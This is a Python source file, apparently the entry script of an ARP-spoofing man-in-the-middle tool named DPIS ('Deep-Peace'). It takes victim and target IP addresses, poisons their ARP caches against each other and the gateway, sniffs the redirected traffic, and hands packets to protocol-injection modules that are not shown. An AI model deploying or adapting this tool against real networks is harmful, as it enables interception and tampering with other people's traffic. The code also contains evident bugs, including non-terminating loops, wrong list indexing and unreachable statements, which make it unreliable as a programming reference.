#! .venv/bin/python
import importlib
import argparse
import importlib.util
import platform
import signal
import sys
import os
import re
import time
import scapy.all as scapy
from lib import logger as liblog

# Regex for checking mac address
r_mac = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
# Regex for checking ip address
r_iadr = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
# Regex for checking port
r_port = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')

targets = 0
log	 = None
host = None

class Target:
	name	= ""
	ip		= ""
	mac		= ""
	valid	= False
	victims = set()

	def __init__(self, ip, name):
		global targets, host
		self.name   = name
		self.ip	 = ip
		if host is not None and self.ip == host[0]:
			self.mac = host[1]
		targets	 = targets + 1

	def get_mac(self) -> bool:
		global r_mac
		# ARP request
		req = scapy.ARP(pdst=self.ip)
		# Broadcast Ethernet layer
		brd = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		# Build the packet
		arp_req = brd / req
		# Wait for the response (2 seconds)
		res = scapy.srp(arp_req, timeout=2, verbose=False)[0]
		# getting the MAC
		if len(res) == 0:
			log.error("host with ip {} seems to be offline.".format(self.ip))
		elif r_mac.match(res[0][1].hwsrc):
			self.valid = True
			self.mac = res[0][1].hwsrc
		return self.valid

# Dynamic Protocol Injector Sniffer (called Deep-Peace)
# TODO: Firewall, StdIn, Socket, Pcap
class DPIS:
	# host interface we're listening to
	iface		= ""
	# host informations [ip, mac]
	host		= ["", ""]
	victims		= set()
	targets		= set()
	# gateway informations Target(gateway)
	gateway		= None
	# toggle stdin for incoming datas
	stdin		= False
	# enable socket to intercept datas
	socket		= None
	# define our instance variables
	sniffer		= None
	spoofer		= None
	firewall	= None
	protocol	= []
	def __init__(self, proto, stdin, victims, targets, spoofing, firewall):
		from lib import sniffer as sniff, spoofing as spoof
		global log, host;
		self.host		= host
		# we detect the gateway for the current interface
		for route in scapy.conf.route.routes:
			if host[2] in route and route[4] == '0.0.0.0' and route[2] != "0.0.0.0":
				self.gateway	= Target(route[2], 'gateway')
				break;
			elif scapy.conf.route.route('0.0.0.0')[2] != "0.0.0.0":
				self.gateway	= Target(scapy.conf.route.route('0.0.0.0')[2], 'gateway')
				break;
		# should be always at the beginning and after host initialisation
		if spoofing:
			self.spoofer	= spoof.Spoofer(self.host, 1)
		sniff_filter	= f""
		p_targets		= []
		p_victims		= []
		routes			= []
		# this part initialize every required protocols
		# also it setup sniffer filter, and create router to protocol function
		try:
			i = 0
			for p in proto:
				_proto = None
				_f = f""
				if len(sniff_filter) != 0:
					_f = _f + f" or "
				if p is None or not isinstance(p, list):
					log.error("tried to initialize protocol number {} but argument is invalid".format(i))
				elif len(p) == 2:
					_proto = importlib.import_module("lib.proto."+p[0]).Protocol(
						self.host, stdin, victims, targets, self.gateway
					)
					hosts = "and ".join("host "+t.ip for t in (victims + targets))
					self.protocol.append(_proto)
				elif len(p) == 4:
					_proto = importlib.import_module("lib.proto."+p[0]).Protocol(
						self.host, stdin, p[2], p[3], self.gateway
					)
					hosts = "and ".join("host "+t.ip for t in (p[2] + [3]))
					self.protocol.append(_proto)
					p_victims = p_victims + p[2]
					p_targets = p_targets + p[3]
					for v in p[2]:
						if not v in self.victims:
							self.victims.add(v)
						for t in p[3]:
							if not v in t.victims and (t.valid or t.get_mac()):
								if spoofing: self.spoofer.spoof(v, t)
								t.victims.add(v)
					for t in p[3]:
						if not t in self.targets:
							self.targets.add(t)
						for v in p[2]:
							if not t in v.victims and (v.valid or v.get_mac()):
								if spoofing: self.spoofer.spoof(t, v)
								v.victims.add(t)
				sniff_filter = _f + f"{_proto.events.protocol} port {p[1]} and ({hosts})"
				log.debug("{} protocol successfully initialized.".format(p[0]))
				def route(dport, sport, pkt) -> None:
					log.print("inside route")
					if dport == p[1] or sport == p[1]:
						log.print("exec route")
						_proto.events.add_queue(pkt);
				route.layer = _proto.events.protocol
				routes.append(route)
		except (Exception or RecursionError or ReferenceError) as E:
			log.error(E)
			sys.exit(2)
		for v in p_victims:
			i = 0;
			while i < len(victims):
				if victims[i].ip == v.ip:
					victims[i] = v
					if not v in self.victims:
						self.victims.add(v)
				elif not victims[i] in self.victims: self.victims.add(victims[i])
		for t in p_targets:
			i = 0;
			while i < len(targets):
				if targets[i].ip == t.ip:
					targets[i] = t
					if not t in self.targets:
						self.targets.add(t)
				elif not targets[i] in self.targets: self.targets.add(targets[i])
		self.sniffer = sniff.Sniffer(
			host[2],
			routes,
			sniff_filter,
			",".join(str(p[1]) for p in proto)
		)
		for v in victims:
			if not v in self.victims:
				self.victims.add(v)
			for t in targets:
				if not v in t.victims and (t.valid or t.get_mac()):
					if spoofing: self.spoofer.spoof(v, t)
					t.victims.add(v)
		for t in targets:
			if not t in self.targets:
				self.targets.add(t)
			for v in victims:
				if not t in v.victims and v.valid or v.get_mac():
					if spoofing: self.spoofer.spoof(t, v)
					v.victims.add(t)

		# TODO: Firewall

		# should be always at the end.
		log.print("current host informations:\n\tinterface:\t{}\n\tip:\t\t{}\n\tmac:\t\t{}\n\tgateway:\t{}\n\ttargets:\t{}\n\tvictims:\t{}\n\tprotocols:\t{}".format(
			host[2],
			host[0],
			host[1],
			self.gateway.ip,
			",".join(t.ip for t in self.victims),
			",".join(t.ip for t in self.targets),
			",".join(" on port ".join([p[0], str(p[1])]) for p in proto)))

	# Start instances and threads.
	def start(self) -> bool:
		global log
		if self.spoofer is not None:
			self.spoofer.start()
		if self.firewall is not None:
			self.firewall.start()
		for p in self.protocol:
			p.start()
		# should be always at the end.
		self.sniffer.start()

	# Stop threads and exit program.
	def stop(self, *_) -> None:
		global log
		log.print("Killing threads and exiting...")
		self.sniffer.stop()
		if self.spoofer is not None:
			self.spoofer.stop()
		if self.firewall is not None:
			self.firewall.start()
		for p in self.protocol:
			p.stop()
		sys.exit(0)

	# Execute readline for specified protocol.
	def stdin(self) -> None:
		True

# Main function, parses every arguments and return dyn class
def main() -> DPIS:
	# import global settings(get all Var)
	global log, r_iadr, host
	print("""
\x1b[1;92m      :::::::::  ::::::::: ::::::::::: :::::::: 
\x1b[0;92m     :+:    :+: :+:    :+:    :+:    :+:    :+: v0.7.5
\x1b[0;32m    +:+    +:+ +:+    +:+    +:+    +:+         
\x1b[0;33m   +#+    +:+ +#++:++#+     +#+    +#++:++#++   
\x1b[0;33m  +#+    +#+ +#+           +#+           +#+ \x1b[0mby \x1b[0;31mN0x4z3r\x1b[0m, \x1b[0;36mRmalet
\x1b[0;93m #+#    #+# #+#           #+#    #+#    #+# \x1b[31mm\x1b[0;93mi\x1b[0;33mt\x1b[0;92mm
\x1b[1;93m#########  ###       ########### ########\x1b[0m

	Dynamic Protocols Injection and Spoofing
	(called Deep-Peace)""")
	# Make sure the script is being run as root
	if platform.system() != "Windows" and os.geteuid() != 0:
		print("\x1b[0;31;40mThis program should be run as root.\x1b[0m")
		exit(1)

	# Parser to handle command-line arguments
	parser = argparse.ArgumentParser()

	#Optionnal firewall settings
	firewall = parser.add_mutually_exclusive_group(required=False)
	firewall.add_argument("-f", "--firewall",
						help="Create multiple firewall rules",
						dest="firewall",
						action='store_true')
	spoofing = parser.add_mutually_exclusive_group(required=False)
	spoofing.add_argument("-S", "--no-spoofing",
						help="Disable ARP spoofing",
						dest="spoofing",
						action='store_false')
	# optionnal: control the verbosity of the program 0 = Silent 3 = most verbose
	parser.add_argument("-v", "--verbose",
						help="Display more informations",
						choices=[0, 1, 2, 3],
						required=False,
						default=0,
						type=int)
	# Set the defaults values for optional arguments
	parser.set_defaults(firewall=False, spoofing=True)

	#Optional : Arg to write in a .pcap file
	#parser.add_argument("-w", "--write", help="create a pcap file.", required=False, default=False)
	# Optional : Arg to execute a terminal protocl via standard input 
	parser.add_argument("-s", "--stdin",
						help="try to execute a terminal protocol.",
						required=False,
						default=False,
						action='store_true')
	#Argument for the network interface listener
	parser.add_argument("iface", help="Set interface listening to")
	#Arguement for the port destination
	parser.add_argument("protocol", help="Define the protocol and port <name>:<port>[:<victim_ip>:<target_ip>[,<name>:<port>[:...]]]")
	#Argument for the ip source
	parser.add_argument("victim", help="List of victims ip address\n\t\t<ip>[,<ip>[,...]]")
	#Argument for the ip source
	parser.add_argument("target", help="List of targets ip address (most of cases server ip address)\n\t\t<ip>[,<ip>[,...]]")

	# parse command-line argument
	args = parser.parse_args()
	# Create our logger instance
	log = liblog.Logger(args.verbose)

	if len(args.iface) == 0:
		log.error("Bad argument <iface> got empty value.")
		exit(1)
	else:
		ifaces = scapy.get_working_ifaces()
		if not args.iface in ifaces:
			log.error("Interface {} doesn't exist or isn't working. printing valid interfaces:\n\t{}".format(args.iface, ifaces))
			exit(1)
	host = [scapy.get_if_addr(args.iface), scapy.get_if_hwaddr(args.iface), args.iface]
	
	args.protocol	= parse_vargs(args.protocol,	"protocol",	":", ";",	parse_proto)
	args.target		= parse_vargs(args.target,		"target",	":", None,	parse_target)[0]
	args.victim		= parse_vargs(args.victim,		"victim",	":", None,	parse_target)[0]

	return DPIS(
		args.protocol,
		args.stdin,
		args.victim,
		args.target,
		args.spoofing,
		args.firewall
	);
	# While the programe is running, accepting stdin process incoming data
	while args.stdin:
		payload = sys.stdin.readline()
		ready = lpkt.psh(payload)
		lpkt.send(ready)

def parse_target(arg, name = "") -> list | None:
	length = len(arg)
	if length == 0:
		log.error("Should specify a {} got empty value".format(name))
		sys.exit(1)
	i = 0
	while i < length:
		if not r_iadr.match(arg[i]):
			log.error("Bad format for {} number {}, should be an ip address got: {}".format(name, i, arg[i]))
			sys.exit(1)
		arg[i] = Target(arg[i], name + str(i))
		i = i + 1
	return arg

def parse_proto(arg, name = "") -> list | None:
	# simple protocol definition:		name, port
	# protocol with victim and target:	name, port, victim, target
	length = len(arg)
	if length == 2 or length == 4:
		if len(arg[0]) == 0 or not isinstance(arg[0], str):
			log.print("bad format for name part of protocol argument:\n\t\tgot: {}".format(arg[0]))
			sys.exit(1)
	else:
		log.print("bad protocol argument.")
		sys.exit(1)
	try:
		float(arg[1])
	except ValueError:
		return None
	else:
		if not float(arg[1]).is_integer():
			log.print("at position 2 for protocol argument expected int got {}".format(type(arg[i])))
			sys.exit(1)
		elif not r_port.match(arg[1]):
			log.error("specified port for protocol {} is invalid".format(arg[0]))
			sys.exit(1)
		arg[1] = int(arg[1])
	i = 2
	while i < length:
		if "," in arg[i]:
			arg[i] = arg[i].split(',')
		else: arg[i] = [arg[i]]
		j = 0
		for ip in arg[i]:
			if not r_iadr.match(ip):
				log.print("at position {} for protocol argument expected an ip address got {}".format(ip))
			sys.exit(1)
			arg[i][j] = Target(ip, arg[0]+"_target"+j if i == length - 1 else arg[0]+"_victim"+j)
			j = j + 1
		i = i + 1
	return arg

# parse a variable argument into a list.
# name is just a string to identify the argument
# sep is an argument delimiter
# split is a variable length delimiter
def parse_vargs(arg, name, sep = ":", split = ",", callback = None) -> list:
	_arg = []
	# detect if variable length
	if split is not None and split in arg:
		arg = arg.split(split)
		if len(arg[0]) == 0 or len(arg[1]) == 0:
			log.error("Bad format for argument {} got: {}".format(name, arg[0]) + split + "{}".format(arg[1]))
			log.error("maybe one side of the argument is incorrect.")
			sys.exit(1)
	# else convert to a simple list
	else: arg = [arg]
	for va in arg:
		# detect format splitter
		if sep in va:
			va = va.split(sep)
		if not isinstance(va, list):
			va = [va]
		if callback is not None:
			_arg.append(callback(va, name))
		else: _arg.append(va)
	return _arg;

if __name__ == "__main__":
	if platform.system() == "Windows":
		time.sleep(4)
	# Call the main fonction
	program = main()
	# Catch interrupt signal and run exit functions
	signal.signal(signal.SIGINT, program.stop)
	program.start()